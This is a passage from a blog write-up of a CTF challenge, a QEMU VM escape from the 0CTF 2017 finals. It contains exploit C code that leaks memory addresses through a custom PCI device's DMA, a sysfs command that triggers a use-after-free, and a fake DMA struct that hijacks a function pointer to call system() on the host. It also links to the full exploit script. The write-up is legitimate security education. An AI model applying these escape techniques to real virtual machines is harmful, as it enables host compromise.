<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phys_mem_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> dst, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_dmastate_dst(dst);</span><br><span class="line">    set_dmalen(len);</span><br><span class="line">    writel(<span class="number">0</span>, piomem + <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_leak</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pbuf = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kmalloc(<span class="number">0x10000</span>, GFP_KERNEL);</span><br><span class="line">    <span class="built_in">memset</span>(pbuf, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    phys_mem_write(virt_to_phys(pbuf), <span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">// xxd(pbuf, 0x1000);</span></span><br><span class="line">    libc_base = search_libc_addr(pbuf, <span class="number">0x1000</span>);</span><br><span class="line">    printk(<span class="string">"libc base:0x%lx\n"</span>, libc_base);</span><br><span class="line">    prog_base = search_prog_addr(pbuf, <span class="number">0x1000</span>);</span><br><span class="line">    printk(<span class="string">"program base:0x%lx\n"</span>, prog_base);</span><br><span class="line">    system_addr = prog_base + SYSTEM_OFFSET;</span><br><span class="line">    printk(<span class="string">"system addr:0x%lx\n"</span>, system_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h3><p>There are three steps to exploit the use-after-free vulnerability:</p>
<ol>
<li>set a timer</li>
<li>trigger <code>pci_vdd_uninit</code></li>
<li>reallocte and rewrite <code>dma_state</code></li>
</ol>
<p>The following command can trigger <code>pci_vdd_uninit</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /sys/bus/pci/slots/4/power</span><br></pre></td></tr></table></figure>
<p>When <code>vdd_dma_timer</code> runs, we can control rip.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_dma_timer</span><span class="params">(TencentPCIState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_read)(</span><br><span class="line">      opaque-&gt;dma_buf,</span><br><span class="line">      opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</span><br><span class="line">      opaque-&gt;dma_buf,</span><br><span class="line">      opaque-&gt;dma_state-&gt;dst,</span><br><span class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd == <span class="number">1</span> )</span><br><span class="line">    vdd_raise_irq(opaque, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Becasue the QEMU is launched with <code>--nographic -append &#39;console=ttyS0&#39;</code>, so we can simply invoke <code>system(cmd)</code> to run a command in host machine and the output will show in console.</p>
<p>To invoke <code>system(cmd)</code>, We need to: </p>
<ol>
<li>set <code>opaque-&gt;dma_state-&gt;phys_mem_read</code> to <code>system</code></li>
<li>set <code>opaque-&gt;dma_buf</code> to <code>cmd</code></li>
<li>make sure <code>opaque-&gt;dma_state-&gt;cmd != 0</code>.</li>
</ol>
<p>In <code>vdd_linear_write</code>, when <code>addr == 0</code>, a buffer will be allocated with size of <code>opaque-&gt;dma_len</code>. And the data in <code>opaque-&gt;dma_state-&gt;src</code> with length of <code>opaque-&gt;dma_len</code> will be copied to <code>opaque-&gt;buf</code>, then copied to <code>opaque-&gt;dma_state-&gt;dst</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_linear_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state &amp;&amp; addr &lt;= <span class="number">13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (_DWORD)((<span class="keyword">char</span> *)off_6EF324 + off_6EF324[addr]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> ( opaque-&gt;buf )</span><br><span class="line">          g_free((rcu_head *)opaque-&gt;buf);</span><br><span class="line">        opaque-&gt;buf = (<span class="keyword">uint8_t</span> *)g_malloc0(opaque-&gt;dma_len);</span><br><span class="line">        vdd_dma_read(opaque-&gt;buf, opaque-&gt;dma_state-&gt;src, opaque-&gt;dma_len);</span><br><span class="line">        vdd_dma_write(opaque-&gt;buf, opaque-&gt;dma_state-&gt;dst, opaque-&gt;dma_len);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_fake_dma</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma</span> <span class="title">fakedma</span>;</span></span><br><span class="line">    fakedma.cmd = <span class="number">2</span>;</span><br><span class="line">    fakedma.phys_mem_read = system_addr;</span><br><span class="line">    <span class="built_in">memcpy</span>(pbuf, (<span class="keyword">void</span> *)&amp;fakedma, <span class="keyword">sizeof</span>(fakedma));</span><br><span class="line">    set_dmalen(<span class="number">0x330</span>);</span><br><span class="line">    set_dmastate_src(virt_to_phys(pbuf));</span><br><span class="line">    set_dmastate_dst(virt_to_phys(pbuf));</span><br><span class="line">    outb(<span class="number">0</span>, VDB_PORT + <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/tixAsK6.png" alt></p>
<p><a href="https://gist.github.com/Eadom/3d5600b6931fbf328ffb20f10eeb3a52" target="_blank" rel="noopener">Exploit script</a></p>
<p>Thanks for Atum’s help.</p>

            


        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">TAGGED IN</span><br/>
                
    <a class="tag tag--primary tag--small t-link" href="/tags/0ctf/">0ctf</a> <a class="tag tag--primary tag--small t-link" href="/tags/qemu/">qemu</a> <a class="tag tag--primary tag--small t-link" href="/tags/writeup/">writeup</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/writeups/uctf-2017-quals-pwn-writeup/"
                    data-tooltip="UCTF2017 初赛 PWN题 Writeup"
                    aria-label="PREVIOUS: UCTF2017 初赛 PWN题 Writeup"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/uncategorized/pwntools-quick-reference-guide/"
                    data-tooltip="Pwntools Quick Reference Guide"
                    aria-label="NEXT: Pwntools Quick Reference Guide"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                    title="Share on Facebook"
                    aria-label="Share on Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                    title="Share on Twitter"
                    aria-label="Share on Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                    title="Share on Google+"
                    aria-label="Share on Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2025 Eadom. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="1">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/writeups/uctf-2017-quals-pwn-writeup/"
                    data-tooltip="UCTF2017 初赛 PWN题 Writeup"
                    aria-label="PREVIOUS: UCTF2017 初赛 PWN题 Writeup"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/uncategorized/pwntools-quick-reference-guide/"
                    data-tooltip="Pwntools Quick Reference Guide"
                    aria-label="NEXT: Pwntools Quick Reference Guide"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                    title="Share on Facebook"
                    aria-label="Share on Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                    title="Share on Twitter"
                    aria-label="Share on Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                    title="Share on Google+"
                    aria-label="Share on Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                
    <div id="share-options-bar" class="share-options-bar" data-behavior="1">
        <i id="btn-close-shareoptions" class="fa fa-times"></i>
        <ul class="share-options">
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                        aria-label="Share on Facebook"
                    >
                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                        aria-label="Share on Twitter"
                    >
                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/"
                        aria-label="Share on Google+"
                    >
                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
                    </a>
                </li>
            
        </ul>
    </div>


            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
        
            <h4 id="about-card-name">Eadom</h4>
        
            <div id="about-card-bio"><p>NO PWN NO FUN</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>@Alibaba</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker-alt"></i>
                <br/>
                Hangzhou
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-rmcrjyesoiaq5zeyncix4j3bagwy19cwj9vg041guvn2zdknk0vkkwd3bneh.min.js"></script>
<!--SCRIPTS END-->


    




    </body>
</html>
